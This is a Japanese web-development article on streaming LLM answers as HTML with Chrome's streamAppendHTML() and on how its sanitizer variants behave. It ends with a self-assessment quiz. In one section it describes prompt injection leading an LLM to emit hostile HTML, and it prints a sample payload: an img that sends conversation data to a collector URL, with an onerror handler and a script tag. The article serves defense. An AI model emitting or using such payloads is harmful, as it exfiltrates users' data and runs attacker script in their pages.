---
id: RZaaYUz0u8LaqF3LpDypY
title: "streamAppendHTML() で AI の回答を HTML のままストリーミング描画する"
slug: "stream-append-html"
about: "LLM の回答を逐次描画するとき、届いた文字列全体を毎回パースして DOM を置き換える実装では、要素が作り直され続けてテキストの選択状態が失われたりします。streamAppendHTML() は WritableStream を返し、届いた HTML を要素の末尾へ順にパースします。この記事では streamAppendHTML() の使い方とサニタイズの挙動について紹介します。"
createdAt: "2026-10-31T16:03+09:00"
updatedAt: "2026-10-31T16:03+09:00"
tags: ["HTML", "JavaScript"]
thumbnail:
  url: "https://images.ctfassets.net/in6v9lxmm5c8/nMV8Y5VNXt3Ifpp6rZBFJ/6e19e55d05d2d0c5022ce38f9f89cc3f/bike_big-scooter_15971-768x591.png"
  title: "ビッグスクーターのイラスト"
audio: null
selfAssessment:
  quizzes:
    - question: "チャンクが <a hr のようにタグの途中で切れたとき、streamAppendHTML() はどう動作しますか？"
      answers:
        - text: "未完成のタグをテキストとして一時的に表示する"
          correct: false
          explanation: "未完成のタグが文字列として画面に表示されることはありません。"
        - text: "TypeError を投げてストリームを中断する"
          correct: false
          explanation: "タグの途中で切れていても例外は発生しません。"
        - text: "呼び出し側がタグの完成を待ってから書き込む必要がある"
          correct: false
          explanation: "パーサーがタグを保持するため、呼び出し側の待機処理は不要です。"
        - text: "パーサーの内部に保持し、タグが完成してから DOM に反映する"
          correct: true
          explanation: "検証では a タグは href の値と閉じ括弧が届いた時点で DOM に現れました。"
    - question: "streamAppendHTMLUnsafe() をデフォルトのオプションで使い、LLM の出力に script 要素と onerror 属性付きの img 要素が含まれていた場合の結果はどれですか？"
      answers:
        - text: "script 要素は実行されないが、onerror は実行される"
          correct: true
          explanation: "runScripts の既定値 false は script 要素を実行しないだけなので、onerror は実行されました。"
        - text: "script 要素も onerror も実行される"
          correct: false
          explanation: "runScripts が既定で false のため、script 要素は実行されませんでした。"
        - text: "script 要素は実行されるが、onerror は実行されない"
          correct: false
          explanation: "結果は逆です。実行されたのは onerror でした。"
        - text: "どちらも除去されて実行されない"
          correct: false
          explanation: "除去するのは Safe 版の動作です。Unsafe 版のサニタイザは既定で無効です。"
published: true
---

b> html-streaming-setters

LLM の回答を画面に少しずつ表示するチャット UI では、未完成の回答を描画し続ける必要があります。最も単純な実装は、届いた内容全体をチャンクごとにパースして要素を置き換える方法です。この方法では回答が長くなるほどパースし直す量が増え、更新のたびに要素が作り直されます。その結果、テキストの選択状態が失われたり、1 度開いた `<details>` が閉じてしまったりします。そのため実際のチャット UI では、Markdown ライブラリが完成した部分を処理し直さない工夫をしています。

[`streamAppendHTML()`](https://developer.chrome.com/blog/declarative-partial-updates) を使うと、この処理の一部をブラウザに任せられます。HTML を文字列のまま要素の末尾へストリーミングでき、すでに描画した要素は作り直されません。

この記事では `streamAppendHTML()` の使い方とサニタイズの挙動について紹介します。

:::warning
2026 年 10 月 31 日時点の手元の確認では、Chrome 158 Beta 以降でフラグなしで `streamAppendHTML()` が使えます。Chrome 156 では使えませんでした。Chrome と Edge の 148 以降は `chrome://flags/#enable-experimental-web-platform-features` を有効にすると試せます。Safari と Firefox は未対応です。
:::

## 従来の実装で起きること

LLM の回答を逐次描画する最も単純な実装方法は次のようになります。届いた文字列を連結し、そのたびに全体を要素へ設定します。

```js
let html = "";
await response.textStream().pipeTo(
  new WritableStream({
    write(chunk) {
      html += chunk;
      element.setHTML(html, { sanitizer });
    },
  }),
);
```

[`textStream()`](https://developer.mozilla.org/en-US/docs/Web/API/Response/textStream) はレスポンスボディを文字列のストリームとして読み出すメソッドです。`setHTML()` は [Sanitizer API](https://developer.mozilla.org/ja/docs/Web/API/HTML_Sanitizer_API) の一部で、HTML をサニタイズしてから要素の内容を置き換えます。

このコードは `write()` が呼ばれるたびに、回答の先頭からパースし直して子要素をすべて置き換えます。その結果、次の問題が起きます。

- 回答が長くなるほど、1 回の更新でパースする文字列が長くなる
- 開いた `<details>`、テキストの選択範囲など、要素に結びついた状態が失われる
- CSS アニメーションが更新のたびに最初から再生される

### 実際のチャット UI で使われている工夫

[Chrome の公式ガイド](https://developer.chrome.com/docs/ai/render-llm-responses)も、蓄積した全文を `innerHTML` に代入する方法は安全でなく遅いと説明しています。実際のチャット UI で使われるライブラリは、Markdown の回答を前提に次のような工夫をしています。

- 回答をブロックに分けてメモ化する: [Streamdown](https://streamdown.ai/docs/memoization) は段落やコードブロックなどの単位で結果を保持し、トークンが届くと影響を受けたブロックだけを再レンダリングする
- ストリーミング対応のパーサーを使う: [streaming-markdown](https://github.com/thetarnav/streaming-markdown) はチャンクごとに処理して新しい要素を追加するだけなので、表示済みの要素を変更しない
- 未完成の記法を補う: Streamdown が使う [remend](https://github.com/vercel/streamdown/tree/main/packages/remend) は `**bold text` を `**bold text**` に補ってから描画する

Markdown では `*` が 1 つ届いただけでは、リストなのか強調なのかが確定しません。streaming-markdown は記号を見た時点で楽観的に要素を作り、remend は足りない記号を補うことで、途中の状態でも描画できるようにしています。

`streamAppendHTML()` は、タグが完成するまでの保持と要素の追加をブラウザの HTML パーサーが行う API です。メモ化の仕組みがなくても、完成した部分を処理し直さずに描画できます。

:::note
LLM に HTML を出力させる必要があります。回答を Markdown のまま扱う場合は、上記のライブラリが引き続き選択肢になります。
:::

## `streamAppendHTML()` の基本

`streamAppendHTML()` は HTML 文字列を受け取らず、[`WritableStream`](https://developer.mozilla.org/ja/docs/Web/API/WritableStream) を返します。fetch のレスポンスをこのストリームへ接続すると、チャンクが届くたびに要素の末尾へ HTML がパースされます。

```js
const response = await fetch("/api/answer");
await response.textStream().pipeTo(element.streamAppendHTML());
```

:::note
`response.body` はバイト列のストリームなので、直接接続しないでください。`Uint8Array` が文字列に変換され、`60,112,62` のような数字の並びが描画されます。`textStream()` を使うと、UTF-8 のテキストとして受け取れます。
:::

:::info
チャンクが `<a hr` のようにタグの途中で切れても、呼び出し側で待つ必要はありません。パーサーが内部に保持し、タグが完成してから DOM に反映します。未完成のタグが文字列として表示されることはありません。
:::

`streamAppendHTML()` 以外にも、挿入位置ごとにメソッドが用意されています。

| 挿入位置 | Safe 版 | Unsafe 版 |
| --- | --- | --- |
| 内容を置き換える | `streamHTML()` | `streamHTMLUnsafe()` |
| 自身を置き換える | `streamReplaceWithHTML()` | `streamReplaceWithHTMLUnsafe()` |
| 直前に挿入する | `streamBeforeHTML()` | `streamBeforeHTMLUnsafe()` |
| 先頭の子として挿入する | `streamPrependHTML()` | `streamPrependHTMLUnsafe()` |
| 末尾の子として挿入する | `streamAppendHTML()` | `streamAppendHTMLUnsafe()` |
| 直後に挿入する | `streamAfterHTML()` | `streamAfterHTMLUnsafe()` |

Safe 版と Unsafe 版の違いは、サニタイズの有無です。Unsafe 版はデフォルトではサニタイズを行わず、HTML をそのままパースします。Safe 版はデフォルトでサニタイズを行い、XSS 攻撃につながる要素や属性を除去します。チャットの回答は既存の要素の末尾へ追加していくので、この記事では `streamAppendHTML()` を使います。

## `streamAppendHTML()` を使った描画を試す

実際に `streamAppendHTML()` を使った描画を試してみましょう。比較用に、前述の `setHTML()` で全体を置き換える最も単純な実装も用意しました。次のコードは、`/api/answer` から回答を取得し `streamAppendHTML()` で描画します。`sanitizer` の設定については後述します。

```js
const response = await fetch("/api/answer");
await response.textStream().pipeTo(element.streamAppendHTML({ sanitizer }));
```

以下の動画では、回答の途中で `<details>` を開いています。

!v(https://videos.ctfassets.net/in6v9lxmm5c8/13N8j88u3IkZBKHgakzzLV/df40db1a5f2a0bdfb94af27678605139/stream-append-html-3.mp4 960x880)

どちらも回答は同じ速さで表示されますが、`setHTML()` 版で開いた `<details>` は次のチャンクで閉じてしまっていることがわかります。`streamAppendHTML()` 版の `<details>` は次のチャンクが届いても開いたままです。

## LLM の出力は信頼できない入力として扱う

ストリーミング描画には、LLM の出力をそのまま DOM に入れるという危険があります。LLM は検索結果や Web ページ、ユーザーが添付した文書を入力として読みます。それらに埋め込まれた指示に従って、LLM が悪意のある HTML を出力する可能性があります。この攻撃はプロンプトインジェクションと呼ばれます。

外部のコンテンツに誘導された LLM が、次の HTML を回答に混ぜた場合を再現します。`<img>` の URL には会話中の情報を含め、別オリジンの攻撃者のサーバーへ送信します。攻撃者のサーバーは 404 を返すので `onerror` が発火し、ページの DOM を書き換えます。

```html
<p>検索結果を要約しました。来月の請求額は <strong>12,800 円</strong> です。</p>
<img
  src="http://localhost:3001/collect?memo=credit-card-ending-4242"
  onerror="document.querySelector('#unsafe').insertAdjacentHTML('beforebegin','<p class=hacked>このページで攻撃者のスクリプトが実行されました</p>')"
/>
<script>
  document.title = "pwned";
</script>
<p>ほかに確認したい項目はありますか？</p>
```

左は `streamAppendHTMLUnsafe()`、右は `streamAppendHTML()` で同じ回答を描画します。

!v(https://videos.ctfassets.net/in6v9lxmm5c8/5gvKwxo9DUlmzDeOCAATE2/dfb91855491f25850f49127aaed2df21/stream-append-html-4.mp4 960x360)

`streamAppendHTML()` を使用した場合は `<img>` と `<script>` が除去され、回答のテキストだけが描画されていることがわかります。一方で `streamAppendHTMLUnsafe()` を使用した場合は `<img>` が描画され、`onerror` が実行されて DOM が書き換えられてしまいました。

`streamAppendHTMLUnsafe()` 版においても `<script>` は実行されていないことに注目してください。Unsafe 版の `runScripts` オプションがデフォルトで `false` だからです。

### デフォルトのサニタイザが除去するもの

Safe 版の `sanitizer` オプションのデフォルトは `"default"` で、ブラウザに組み込まれた設定が使われます。この設定は XSS を防ぐだけでなく、許可リスト方式で多くの要素と属性を除去します。Chrome 158 Beta と Chrome 159 で実際の結果を確認すると、以下のようになりました。

| 入力 | 既定のサニタイザの結果 |
| --- | --- |
| `<img src="...">` | 要素ごと除去 |
| `<details>`、`<summary>` | 要素ごと除去 |
| `<div class="c" id="x" style="color:red">` | 属性を除去して `<div>` |
| `<pre><code class="language-js">` | `class` を除去 |
| `<a href="https://example.com" target="_blank">` | `target` を除去して `href` は残る |
| `<a href="javascript:...">` | `href` を除去 |
| `<script>`、`<style>`、`<iframe>`、`<form>`、`<template>` | 要素ごと除去 |
| `<table>`、`<h2>`、`<blockquote>` | そのまま残る |

`new Sanitizer().get()` を実行すると、許可されている要素と属性の一覧を取得できます。

```js
const sanitizer = new Sanitizer();
console.log(sanitizer.get());
// {
//   attributes: [...],
//   elements: [...],
//   comments: false,
//   dataAttributes: false,
//   processingInstructions: [],
// }
```

### 許可する要素を絞る

チャットの回答で使う要素が決まっているなら、[`Sanitizer`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer) で許可する要素を列挙するほうが、攻撃者が使える要素を減らせます。実際に比較のデモでも次の設定を使っています。`<details>` はデフォルトでは除去されてしまうので、明示的に許可しています。

```js
const sanitizer = new Sanitizer({
  elements: [
    "h2", "h3", "p", "ul", "ol", "li", "pre", "code", "strong", "em",
    "blockquote", "details", "summary",
    { name: "a", attributes: ["href"] },
  ],
});

await response.textStream().pipeTo(element.streamAppendHTML({ sanitizer }));
```

Safe 版は、設定で許可しても XSS につながるものを通しません。例えば `elements` に `"script"` を指定しても `<script>` は除去されます。

:::warning
サニタイザが防ぐのは XSS であり、外部への情報送信は防ぎません。例えば `<img>` の `src` を許可すると、URL へのリクエストは送信されます。画像を許可する場合は、CSP の `img-src` などで送信先を制限してください。
:::

## 回答の生成を止める

チャット UI の「生成を停止」ボタンは [`AbortController`](https://developer.mozilla.org/ja/docs/Web/API/AbortController) で実装できます。同じ `signal` を `fetch()` と `pipeTo()` に渡します。

```js
const controller = new AbortController();
stopButton.addEventListener("click", () => controller.abort());

try {
  const response = await fetch("/api/answer", { signal: controller.signal });
  await response
    .textStream()
    .pipeTo(element.streamAppendHTML(), { signal: controller.signal });
} catch (error) {
  // ユーザーによる中断はエラーとして表示しない
  if (error.name !== "AbortError") throw error;
}
```

中断すると `pipeTo()` の Promise は `AbortError` で拒否されます。`<p>one<ul><li>two` まで届いた時点で中断した場合、DOM は中断前と同じ `<p>one</p><ul><li>two</li></ul>` のまま残りました。閉じタグが届いていなくても、それまでに描画した部分が崩れることはありません。

次の動画では、回答の途中で「生成を停止」をクリックして `AbortError` が発生する様子を示しています。回答の続きは描画されませんが、途中まで描画した内容はそのまま残っています。

!v(https://videos.ctfassets.net/in6v9lxmm5c8/ox95AtPyjpU3tzzpFT5Oh/c6eb95bbb250b2047e08eaddb30e81d4/stream-append-html-5.mp4 960x560)

## まとめ

- `streamAppendHTML()` は `WritableStream` を返し、`response.textStream().pipeTo(element.streamAppendHTML())` で HTML を要素の末尾へ逐次パースする
- 全置換の課題に対して Markdown ライブラリはブロックのメモ化やストリーミングパーサーで対処しており、`streamAppendHTML()` は同様の処理を HTML についてブラウザが担う
- タグの途中で切れたチャンクはパーサーが保持するので、未完成のタグは DOM に現れない
- LLM の出力はプロンプトインジェクションの影響を受けるので、信頼できない入力として Safe 版で描画する
- `streamAppendHTMLUnsafe()` はデフォルトではサニタイズを行わないので、`onerror` などのイベントハンドラ属性が実行される。`<script>` は `runScripts` がデフォルトで `false` のため実行されない
- デフォルトのサニタイザは `<img>`、`<details>`、`class` も除去するので、必要な要素は `Sanitizer` の許可リストに指定する

## 参考

- [declarative partial updates | Chrome for Developers](https://developer.chrome.com/blog/declarative-partial-updates)
- [Chrome 155 beta | Chrome for Developers](https://developer.chrome.com/blog/chrome-155-beta)
- [Best practices to render streamed LLM responses | Chrome for Developers](https://developer.chrome.com/docs/ai/render-llm-responses)
- [Memoization | Streamdown](https://streamdown.ai/docs/memoization)
- [thetarnav/streaming-markdown](https://github.com/thetarnav/streaming-markdown)
- [Dynamic markup revamped explainer](https://github.com/WICG/declarative-partial-updates/blob/main/dynamic-markup-revamped-explainer.md)
- [Add streaming HTML insertion methods - whatwg/html#12758](https://github.com/whatwg/html/pull/12758)
- [A way to stream content into an element - whatwg/html#2142](https://github.com/whatwg/html/issues/2142)
- [Coherent story for HTML-setting methods - whatwg/html#11669](https://github.com/whatwg/html/issues/11669)
- [Streaming sanitizer support - whatwg/html#12543](https://github.com/whatwg/html/issues/12543)
- [Intent to Ship: Renewed HTML insertion&streaming methods](https://www.mail-archive.com/blink-dev@chromium.org/msg16984.html)
